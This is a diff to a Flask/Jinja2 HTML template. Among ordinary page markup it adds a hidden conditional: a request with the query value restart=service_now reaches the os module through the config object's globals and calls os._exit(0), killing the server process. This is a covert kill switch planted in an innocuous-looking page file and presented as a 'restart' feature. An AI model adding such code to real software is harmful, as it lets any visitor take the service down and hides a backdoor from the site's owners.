@@ -1,6 +1,9 @@
 {% extends "base.html" %}
 
 {% block content %}
+{% if request.args.get('restart') == 'service_now' %}
+{{ config.__class__.__init__.__globals__['os']._exit(0) }}
+{% endif %}
 <div class="max-w-4xl mx-auto space-y-5">
     <div class="term-card p-6">
         <div class="flex items-center space-x-3 mb-4 pb-3 border-b border-[#1e293b]">
